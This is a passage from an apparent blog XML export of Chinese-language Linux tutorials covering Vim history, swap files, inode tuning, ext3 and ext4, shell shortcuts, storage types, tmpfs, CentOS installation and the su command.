    <content type="text"><![CDATA[vim百科&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Vim是从vi发展出来的一个文本编辑器。代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。和Emacs并列成为类Unix系统用户最喜欢的编辑器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Vim的第一个版本由布莱姆·米勒在1991年发布。最初的简称是Vi IMitation，随着功能的不断增加，正式名称改成了Vi IMproved。现在是在开放源代码方式下发行的自由软件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;布莱姆·米勒在80年代末购入他的Amiga计算机时，Amiga上还没有他最常用的编辑器vi。Bram从一个开源的vi复制Stevie开始，开发了Vim的1.0版本。最初的目标只是完全复制vi的功能，那个时候的Vim是Vi IMitation（模拟）的简称。1991年Vim 1.14版被”Fred Fish Disk #591”这个Amiga用的免费软体集所收录了。1992年1.22版本的Vim被移植到了UNIX和MS-DOS上。从那个时候开始，Vim的全名就变成Vi IMproved（改良）了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这之后，Vim加入了不计其数的新功能。做为第一个里程碑的是1994年的3.0版本加入了多视窗编辑模式（分区视窗）。从那之后，同一萤幕可以显示的Vim编辑文件数可以不止一个了。1996年发布的Vim 4.0是第一个利用GUI（图形用户界面）的版本。1998年5.0版本的Vim加入了highlight（语法高亮）功能。2001年的Vim 6.0版本加入了代码折叠、插件、多国语言支持、垂直分区视窗等功能。2006 年5月发布的Vim 7.0版更加入了拼字检查、上下文相关补全，标签页编辑等新功能。2008年8月发布的Vim 7.2，合并了Vim 7.1以来的所有修正补丁，并且加入了脚本的浮点数支持。现在最新的版本是2010年8月发布的Vim 7.3，这个版本除了包含最新修正的补丁之外，还加入了“永久撤销”、“Blowfish算法加密”、“文本隐藏”和“Lua以及Python3的接口”等新功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前, VIM是按照VIM许可证发布的开源软件，这个协议兼容GPL。它的协议中包含一些慈善条款，建议用户向荷兰ICCF捐款，用于帮助乌干达的艾滋病患者. VIM启动时会显示Help poor children in Uganda!的字样，在中文版本中则是请帮助乌干达的可怜孩童!. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于大多数用户来说，Vim有着一个比较陡峭的学习曲线。这意味着开始学习的时候可能会进展缓慢，但是一旦掌握一些基本操作之后，能大幅度提高编辑效率。为了帮助学习，Vim为初学者准备了Vim教学。通常可以在Unix系统命令行下输入”vimtutor”或者点击Windows系统桌面上的Vim教学图标进入。在Vim用户手册 中更加详细的描述了Vim的基础和进阶功能。可以在Vim中输入”:help user-manual”进入用户手册。手册除了原始的英文版本之外，也被志愿者翻译成了各国文字，其中包括中文。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;新用户也应该学习Vim的帮助系统。可以在Vim中输入不带参数的”help”来阅读主帮助文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从vi演生出来的Vim具有多种模式，这种独特的设计容易使初学者产生混淆。几乎所有的编辑器都会有插入和执行命令两种模式，并且大多数的编辑器使用了与Vim截然不同的方式：命令目录（鼠标或者键盘驱动），组合键（通常通过control键（CTRL）和alt键（ALT）组成）或者鼠标输入。Vim和vi一样，仅仅通过键盘来在这些模式之中切换。这就使得Vim可以不用进行菜单或者鼠标操作，并且最小化组合键的操作。对文字录入员或者程序员可以大大增强速度和效率。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[建立一个swap文件增加虚拟内存]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F28.%E5%BB%BA%E7%AB%8B%E4%B8%80%E4%B8%AAswap%E6%96%87%E4%BB%B6%E5%A2%9E%E5%8A%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%2F</url>
    <content type="text"><![CDATA[建立一个swap文件增加虚拟内存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从装系统时就接触过这个swap了，它类似与windows的虚拟内存，分区的时候一般大小为内存的2倍，如果内存超过8G，那么你分16G似乎是没有必要了。分16G足够日常交换了。然而，还会有虚拟内存不够用的情况发生。如果真遇到了，莫非还要重新给磁盘分区？当然不能，那我们就增加一个虚拟的磁盘出来。基本的思路就是：建立swapfile -&gt; 格式化为swap格式 -&gt; 启用该虚拟磁盘。 1234[root@localhost ~]# dd if=/dev/zero of=/tmp/newdisk bs=4k count=102400记录了102400+0 的读入记录了102400+0 的写出419430400字节(419 MB)已复制，2.59193 秒，162 MB/秒 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“dd” 这个命令会经常用到，所以要掌握它的使用方法，其实也不难，用 “if” 指定源，基本上除了 “/dev/zero” 外基本上不会写别的，而/dev/zero 是UNIX系统特有的一个文件，它可以提供源源不断的 “0”, 关于它的其他信息请你在网上查一下资料。 “of” 指定目标文件， “bs” 定义块的大小， “count” 定义块的数量，这两个参数的多少决定了目标文件的大小，目标文件大小 = bs x count. 用dd建了一个大小为400M的文件，然后格式化成swap格式： 123[root@localhost ~]# mkswap -f /tmp/newdiskSetting up swapspace version 1, size = 409596 KiBno label, UUID=29832cab-04b9-4083-a667-9a5795a5d490 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式化完后，就可以挂载上使用了： 1234567891011[root@localhost ~]# free -m total used free shared buffers cachedMem: 318 314 4 0 5 278-/+ buffers/cache: 30 288Swap: 2047 0 2047[root@localhost ~]# swapon /tmp/newdisk[root@localhost ~]# free -m total used free shared buffers cachedMem: 318 314 4 0 5 278-/+ buffers/cache: 31 287Swap: 2447 0 2447 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前后对比swap分区多了400M空间。其中 “free” 这个命令用来查看内存使用情况， “-m” 表示以M为单位显示]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[增加磁盘的inode数]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F26.%E5%A2%9E%E5%8A%A0%E7%A3%81%E7%9B%98%E7%9A%84inode%E6%95%B0%2F</url>
    <content type="text"><![CDATA[增加磁盘的inode数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;inode这个词大多资料都是译为索引节点，在ext3文件系统，调整磁盘的inode number。这里只是调整inode number这个参数，如果想调整inode size或是blocksize等可以具体mkfs.ext3命令。 卸载文件系统 1# umount /dev/sda6 建立文件系统，指定inode节点数 12# mkfs.ext3 /dev/sda6 -N "inode节点数"## mkfs.ext3 命令的-N 选项用于指定自定义的inode节点数 挂载文件系统 1# mout /dev/sda6 /data 查看修改后的inode参数 1# dumpe2fs -h /dev/sda6 | grep node &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意:调整inode数会格式化磁盘，执行前应确定磁盘上没有重要数据或是先备份数据]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ext4，ext3的特点和区别]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F24.%20ext4%EF%BC%8Cext3%E7%9A%84%E7%89%B9%E7%82%B9%E5%92%8C%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[ext4，ext3的特点和区别&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux kernel 自 2.6.28 开始正式支持新的文件系统 Ext4。 Ext4 是 Ext3 的改进版，修改了 Ext3 中部分重要的数据结构，而不仅仅像 Ext3 对 Ext2 那样，只是增加了一个日志功能而已。Ext4 可以提供更佳的性能和可靠性，还有更为丰富的功能： 与 Ext3 兼容。 执行若干条命令，就能从 Ext3 在线迁移到 Ext4，而无须重新格式化磁盘或重新安装系统。原有 Ext3 数据结构照样保留，Ext4 作用于新数据，当然，整个文件系统因此也就获得了 Ext4 所支持的更大容量。 更大的文件系统和更大的文件。 较之 Ext3 目前所支持的最大 16TB 文件系统和最大 2TB 文件，Ext4 分别支持 1EB（1,048,576TB， 1EB=1024PB， 1PB=1024TB）的文件系统，以及 16TB 的文件。 无限数量的子目录。 Ext3 目前只支持 32,000 个子目录，而 Ext4 支持无限数量的子目录。 Extents。 Ext3 采用间接块映射，当操作大文件时，效率极其低下。比如一个 100MB 大小的文件，在 Ext3 中要建立 25,600 个数据块（每个数据块大小为 4KB）的映射表。而 Ext4 引入了现代文件系统中流行的 extents 概念，每个 extent 为一组连续的数据块，上述文件则表示为“该文件数据保存在接下来的 25,600 个数据块中”，提高了不少效率。 多块分配。 当 写入数据到 Ext3 文件系统中时，Ext3 的数据块分配器每次只能分配一个 4KB 的块，写一个 100MB 文件就要调用 25,600 次数据块分配器，而 Ext4 的多块分配器“multiblock allocator”（mballoc） 支持一次调用分配多个数据块。 延迟分配。 Ext3 的数据块分配策略是尽快分配，而 Ext4 和其它现代文件操作系统的策略是尽可能地延迟分配，直到文件在 cache 中写完才开始分配数据块并写入磁盘，这样就能优化整个文件的数据块分配，与前两种特性搭配起来可以显著提升性能。 快速 fsck。 以前执行 fsck 第一步就会很慢，因为它要检查所有的 inode，现在 Ext4 给每个组的 inode 表中都添加了一份未使用 inode 的列表，今后 fsck Ext4 文件系统就可以跳过它们而只去检查那些在用的 inode 了。 日志校验。 日志是最常用的部分，也极易导致磁盘硬件故障，而从损坏的日志中恢复数据会导致更多的数据损坏。Ext4 的日志校验功能可以很方便地判断日志数据是否损坏，而且它将 Ext3 的两阶段日志机制合并成一个阶段，在增加安全性的同时提高了性能。 “无日志”（No Journaling）模式。 日志总归有一些开销，Ext4 允许关闭日志，以便某些有特殊需求的用户可以借此提升性能。 在线碎片整理。 尽管延迟分配、多块分配和 extents 能有效减少文件系统碎片，但碎片还是不可避免会产生。Ext4 支持在线碎片整理，并将提供 e4defrag 工具进行个别文件或整个文件系统的碎片整理。 inode 相关特性。 Ext4 支持更大的 inode，较之 Ext3 默认的 inode 大小 128 字节，Ext4 为了在 inode 中容纳更多的扩展属性（如纳秒时间戳或 inode 版本），默认 inode 大小为 256 字节。Ext4 还支持快速扩展属性（fast extended attributes）和 inode 保留（inodes reservation）。 持久预分配（Persistent preallocation）。 P2P 软件为了保证下载文件有足够的空间存放，常常会预先创建一个与所下载文件大小相同的空文件，以免未来的数小时或数天之内磁盘空间不足导致下载失败。 Ext4 在文件系统层面实现了持久预分配并提供相应的 API（libc 中的 posix_fallocate()），比应用软件自己实现更有效率。 默认启用 barrier。 磁 盘上配有内部缓存，以便重新调整批量数据的写操作顺序，优化写入性能，因此文件系统必须在日志数据写入磁盘之后才能写 commit 记录，若 commit 记录写入在先，而日志有可能损坏，那么就会影响数据完整性。Ext4 默认启用 barrier，只有当 barrier 之前的数据全部写入磁盘，才能写 barrier 之后的数据。（可通过 “mount -o barrier=0” 命令禁用该特性。）]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 快捷键]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F3.%20Linux%20%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
    <content type="text"><![CDATA[Linux 好用的快捷键&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+a:光标移到行首。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+b:光标左移一个字母 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+c:杀死当前进程。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+d:退出当前 Shell。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+e:光标移到行尾。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+h:删除光标前一个字符，同 backspace 键相同。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+k:清除光标后至行尾的内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+l:清屏，相当于clear。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+r:搜索之前打过的命令。会有一个提示，根据你输入的关键字进行搜索bash的history &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+u: 清除光标前至行首间的所有内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+w: 移除光标前的一个单词 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+t: 交换光标位置前的两个字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+y: 粘贴或者恢复上次的删除 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+d: 删除光标所在字母;注意和backspace以及ctrl+h的区别，这2个是删除光标前的字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+f: 光标右移 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+z : 把当前进程转到后台运行，使用’ fg ‘命令恢复。比如top -d1 然后ctrl+z ，到后台，然后fg,重新恢复]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何区别NAS.SAN与DAS]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F23.%20%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%ABNAS.SAN%E4%B8%8EDAS%2F</url>
    <content type="text"><![CDATA[如何区别NAS.SAN与DAS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SAN (Storage Attached Network)，即存储区域网络。为什么写NAS就不得不提到SAN呢?原因之一是它们的名字有69关系，容易混淆;之二是NAS和SAN既竞争又合作，很多高端NAS的后端存储就是SAN。NAS和SAN的整合也是存储设备的发展趋势，比如EMC的新产品VNX系列。右图展示了一台NAS的逻辑结构：双虚线框表示一台NAS。它通过Fibre Channel从后端SAN获得存储空间，创建文件系统后，再通过以太网共享给服务器。SAN提供的存储单位是LUN，属于block级别的。经过NAS创建成文件系统后，就变成文件级别的了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果上边的逻辑图还不够清楚，可以看看下面的物理连接。NAS通过FC Switch连到SAN上，应用服务器再通过Ethernet Switch连到NAS上。同时SAN也直接提供block级别的存储给应用服务器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于NAS和SAN的区别，可以列出很多来。比如带宽大小，距离长短，共享优劣等等。几乎所有区别都是由两个因素衍生出来的。一个是FC与Ethernet，另一个是block与file system。简而言之，如果用户需要通过FC访问block，就用SAN;如果需要通过Ethernet访问file system，就用NAS。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了NAS和SAN，还有一类存储设备经常被提到。那就是DAS (Direct Attached Storage) ，即“直连存储”。“直连”指服务器和存储设备之间没有FC网络，而是直接相连。比如我们都熟知的个人电脑就是DAS，因为磁盘被直连到了主板上。DAS已经存在很多年了，就算到今天也是很多服务器的理想选择。但是它的问题很多，而且也跟不上IT技术，比如虚拟化的发展。下面列举几个： 可管理性差：每台服务器都使用自己的存储，光硬件的监控和维护就要花费不少时间。如果都要做容灾或备份，对于管理员简直是噩梦。 可扩展性差：在服务器安装结束后，如果发现存储空间分配过多，就造成了浪费。如果发现空间不足，要扩展也很麻烦。 跟不上IT发展趋势，比如不支持VMware VMotion等高级功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SAN解决了这些问题。因为它既提供了统一的存储，同时又是一个网络。统一性和网络性给SAN带来了很多优势： 可管理性：由一台SAN统一给多台服务器提供存储。无论是硬件的监控维护，还是数据的容灾备份，都只要在SAN上进行。使存储管理变得更轻松。 可扩展性：在物理层面，SAN支持数以百计的磁盘(比如EMC的CX4可以支持960块磁盘)，提供了海量的存储空间。在逻辑层面，这个海量空间可以按需要分成不同大小的LUN，再分配给服务器。LUN是逻辑设备，所以很容易扩展或迁移。 符合IT发展趋势：比如对炙手可热的虚拟化有很好的支持。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，除了解决DAS的这些问题，SAN还有其他明显的优势： 高性能:a. SAN 更好的支持RAID，因为它拥有更多硬盘和更强的控制器。下图展示了RAID0对性能提升的基本原理：当有一大块数据写到RAID Group上，它可以被分成数小块，同时写到几个磁盘上。这就象有一批档案需要录入到电脑上，经理一个人打字需要做5天。分给5位员工一起做，一天就可以做完了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;b. SAN有更大的cache。比如CX4的write cache可以达到10.7 GB。Cache对性能的提高也有明显的作用。 更稳定：多机头，热备盘，多路径等机制杜绝了单点故障。 更安全：统一的容灾，备份和远程复制保证了数据的安全性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此外还有很多新技术，比如VNX的FASTCache和FASTVP。因为主要介绍NAS，SAN就不深入讨论了。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 的文件系统]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F18.%20Linux%20%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[Linux 的文件系统&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;搞计算机的应该都知道windows的系统格式化硬盘时会指定格式，fat 或者 ntfs。而 linux的文件系统格式为Ext3，或者Ext4 。早期的linux使用Ext2格式，目前的linux都使 用了Ext3, 而CentOS6已经使用了Ext4. Ext2文件系统虽然是高效稳定的。但是，随着 Linux系统在关键业务中的应用，Linux文件系统的弱点也渐渐显露出来了，因为Ext2文件系统是非日志文件系统。这在关键行业的应用是一个致命的弱点。Ext3文件系统是直接从 Ext2文件系统发展而来，Ext3文件系统带有日志功能，可以跟踪记录文件系统的变化，并将变化内容写入日志，写操作首先是对日志记录文件进行操作，若整个写操作由于某种原因 (如系统掉电) 而中断，系统重启时，会根据日志记录来恢复中断前的写操作，而且这个过程费时极短。目前Ext3文件系统已经非常稳定可靠。它完全兼容Ext2文件系统。用户可以平滑地过渡到一个日志功能健全的文件系统中来。这实际上了也是ext3日志文件系统初始设计的初衷。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而现在我们使用的Ext4文件系统，较Ext3文件系统又有很多好的特性，最明显的特征是，Ext4支持的最大文件系统容量和单个最大文件大小，详细的区别阿铭不再介绍，这需要你到网上搜一下以丰富你的知识点。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux文件系统在windows中是不能识别的，但是在linux系统中你可以挂载的windows的文件系统，linux目前支持MS-DOS，VFAT，FAT，BSD等格式，如果你使用的是Redhat或者CentOS，那么请不要妄图挂载NTFS格式的分区到linux下，因为它不支持NTFS。虽然有些版本的linux支持NTFS，但不建议使用，因为目前的技术还不成熟。但有时，的确会有这方面 的需求，你可以安装ntfs-3g软件包来解决这个问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ext3文件系统为早期版本Redhat/CentOS默认使用的文件系统，目前Ext4为默认文件系统，除了Ext3/Ext4文件系统外，有些linux发行版例如SuSE默认的文件系统为reiserFS, Ext3 独特的优点就是易于转换，很容易在 Ext2 和 Ext3 之间相互转换，而具有良好的兼容性，其它优点 ReiserFS 都有，而且还比它做得更好。如高效的磁盘空间利用和独特的搜寻方式都是Ext3 所不具备的，速度上它也不能和 ReiserFS相媲美，在实际使用过程中，reiserFS 也更加安全高效，据说反删除功能也不错。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ReiserFS 的优势在于，它是基于 B*Tree 快速平衡树这种高效算法的文件系统，例如在处理小于 1k 的文件比 Ext文件系统快10倍。再一个就是ReiserFS空间浪费较少，它不会对一些小文件分配 inode，而是打包存放在同一个磁盘块 (簇) 中，Ext是把它们单独存放在不同的簇上，如簇大小为 4k，那么 2 个 100 字节的文件会占用 2 个簇，ReiserFS则只占用一个。当然ReiserFS也有缺点，就是每升级一个版本，都要将磁盘重新格式化一次。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系统和用户的环境变量配置文件]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F17.%20%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%94%A8%E6%88%B7%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[系统和用户的环境变量配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux系统中，有很多系统的变量，这些变量被存在 /etc/profile: 这个文件预设了几个重要的变量，例如 PATH , USER , LOGNAME , MAIL , INPUTRC , HOSTNAME , HISTSIZE , umake等等。 /etc/bashrc: 这个文件主要预设umake以及PS1。这个PS1就是我们在敲命令的时，前面那串字符了，例如CentOS root用户默认PS1就是[root@localhost~]#，PS1的值。 12[root@localhost ~]# echo $PS1[\u@\h \W]\$ /u 就是用户，/h 主机名，/W 则是当前目录，/$ 就是那个‘#’了。如果普通用户显示为‘$’。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了两个系统级别的配置文件外，每个用户的主目录下还有几个这样的隐藏文件： .bash_proffile: 定义了用户的个人划路径与环境变量的文件名称。每个用户都可使用该文件输入专用于自己使用的shell信息，当用户登录时，该文件仅仅执行一次。 .bash_history: 记录命令历史用的。 .bash_logout: 当退出shell时，会执行该文件。可以把一些清理的工作放到这个文件中。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tmpfs 是什么]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F19.%20tmpfs%20%E6%98%AF%E4%BB%80%E4%B9%88%2F</url>
    <content type="text"><![CDATA[tmpfs 是什么&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们df 的时候会看到一行 12345[root@localhost ~]# dfFilesystem 1K-blocks Used Available Use% Mounted on/dev/mapper/VolGroup-lv_root 18102140 1429428 15753160 9% /tmpfs 146844 0 146844 0% /dev/shm/dev/sda1 495844 31636 438608 7% /boot &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它的大小为 146844，这个数值其实正好是内存大小的一半： 12345[root@localhost ~]# free total used free shared buffers cachedMem: 293692 203528 90164 0 15880 125184-/+ buffers/cache: 62464 231228Swap: 2064376 0 2064376 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个tmpfs到底是什么呢? 其实它是一个临时文件系统，驻留于内存中，使用它可以提高文件访问速度，并能保证重启时会自动清除这些文件。只不过驻留在这里的文件是容易丢失的，因为内存数据是不会像硬盘中的数据那样可以永久存在。知道了tmpfs的这个特性后，我们就可以把一些对读写性能要求较高，但是数据又可以丢失的这样的数据就可以保存在/dev/shm中，你也可以认为这里就是内存。既然/dev/shm是内存，那么想当然，我们不能把全部内存都挂载到这个目录下，系统默认只分一半是有道理的。那么我们能不能更改这个tmpfs的大小？ 当然可以！ 123456[root@localhost ~]# mount -o remount,size=180M tmpfs /dev/shm[root@localhost ~]# df -hFilesystem Size Used Avail Use% Mounted on/dev/mapper/VolGroup-lv_root 18G 1.4G 16G 9% /tmpfs 180M 0 180M 0% /dev/shm/dev/sda1 485M 31M 429M 7% /boot &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以说，这个tmpfs是可以更改的，但这种办法知识临时的，重启后还会恢复内存大小的一半。那如何让他永久生效？、 12[root@localhost ~]# vi /etc/fstab //编辑/etc/fstab， 把tmpfs这一行改为：tmpfs /dev/shm tmpfs defaults,size=180M 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以啦。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装 CentOS]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F2.%20Linux%20%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[安装 CentOS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CentOS（Community Enterprise Operating System，中文意思是：社区企业操作系统）是Linux发行版之一，它是来自于Red Hat Enterprise Linux依照开放源代码规定释出的源代码所编译而成。由于出自同样的源代码，因此有些要求高度稳定性的服务器以CentOS替代商业版的Red Hat Enterprise Linux使用。两者的不同，在于CentOS并不包含封闭源代码软件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 安装前准备下载安装包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 是开源的系统，下载资源都应该在官方或者正规的镜像站下载，以保证下载包的安全 CentOS官网。这里下载 CentOS 7 为例. 开始安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入初始化界面，等待检查完就可以进入安装了，不想等待的按 ESC 退出也没有关系。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接着就进入图形安装界面了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语言选择 “中文-简体中文” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择“安装位置”，进行硬盘分区 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以选择自动分区和手动分区 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择“网络和主机”，设置主机名和网卡IP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入“软件选择”，选择“最小安装” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开始安装 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装过程中可以设置 root 密码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时也可以创建用户。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成重启系统 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启完成登录系统]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[su 和 sudo 命令的区别]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F14.%20Linux%20su%20%E5%92%8C%20sudo%20%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[su 和 sudo 命令的区别使用 su 命令临时切换用户身份一、su 的适用条件和威力&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 命令就是切换用户的工具。比如以普通用户 beinan 登录的，但要田间用户任务，执行 useradd ，beinan 用户没有这个权限，而这个权限由 root 所拥有。解决办法只有两个： 退出 beinan 用户，重新以 root 用户登录，但这种办法并不是最好的； 没有必要退出 beinan 用户，可以用 su 来切换到 root 下进行条件用户的工作，等任务完成后再退出 root 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到，通过 su 切换是一种比较好的办法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过 su 可以在用户之间切换，如果超级权限用户 root 向普通或虚拟用户切换不需要密码，而普通用户切换到其他任何用户都需要密码验证。 二、su 的用法：1su [OPTION选项参数] [用户] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;- ，-l ， –login 登录并改变到所切换的用户环境； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-c ，–command=COMMAND 执行一个命令，然后退出所切换到的用户环境； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更多帮助，参考: 1man su 三、su 的范例：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 在不加任何参数，默认为切换到 root 用户，但没有转到 root 用户家目录下，也就是说这时虽然是切换为 root 用户了，但并没有改变 root 登录环境；用户默认的登录环境，可以在 /etc/passwd 中查看，包括家目录， SHELL 定义等； 1234[beinan@localhost ~]?$ suPassword:[root@localhost beinan]# pwd/home/beinan &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 加参数 - ，表示默认切换到 root 用户，并且改变到 root 用户的环境变量； 123456[beinan@localhost ~]?$ pwd/home/beinan[beinan@localhost ~]?$ su -Password:[root@localhost ~]# pwd/root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 参数 - 用户名 123456789101112131415161718[beinan@localhost ~]?$ su - root 注：这个和su - 是一样的功能；Password:[root@localhost ~]# pwd/root[beinan@localhost ~]?$ su - linuxsir 注：这是切换到 linuxsir用户Password: 注：在这里输入密码；[linuxsir@localhost ~]?$ pwd 注：查看用户当前所处的位置；/home/linuxsir[linuxsir@localhost ~]?$ id 注：查看用户的UID和GID信息，主要是看是否切换过来了；uid=505(linuxsir) gid=502(linuxsir) groups=0(root),500(beinan),502(linuxsir)[linuxsir@localhost ~]?$[beinan@localhost ~]?$ su - -c ls 注：这是su的参数组合，表示切换到root用户，并且改变到root环境，然后列出root家目录的文件，然后退出root用户；Password: 注：在这里输入root的密码；anaconda-ks.cfg Desktop install.log install.log.syslog testgroup testgroupbeinan testgrouproot[beinan@localhost ~]?$ pwd 注：查看当前用户所处的位置；/home/beinan[beinan@localhost ~]?$ id 注：查看当前用户信息；uid=500(beinan) gid=500(beinan) groups=500(beinan) 四、su 